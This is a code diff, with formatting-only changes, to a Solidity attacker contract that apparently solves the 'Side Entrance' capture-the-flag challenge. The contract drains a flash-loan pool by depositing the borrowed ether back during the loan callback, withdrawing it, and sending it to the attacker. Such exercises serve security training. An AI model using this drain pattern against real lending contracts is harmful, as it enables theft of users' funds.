@@ -8,7 +8,6 @@ interface IChallenge {
 }
 
 contract SideEntranceAttacker {
-
     address attacker;
     IChallenge challenge;
 
@@ -17,20 +16,19 @@ contract SideEntranceAttacker {
         attacker = msg.sender;
     }
 
-    function attack() external{
+    function attack() external {
         uint256 challengeBalance = address(challenge).balance;
         challenge.flashLoan(challengeBalance);
         challenge.withdraw();
     }
 
     function execute() external payable {
-        require (msg.sender == address(challenge), "caller must be lender pool");
+        require(msg.sender == address(challenge), "caller must be lender pool");
         challenge.deposit{value: msg.value}();
     }
 
     receive() external payable {
-        (bool success, ) = attacker.call{value : address(this).balance}("");
-        require (success);
+        (bool success,) = attacker.call{value: address(this).balance}("");
+        require(success);
     }
-    
 }
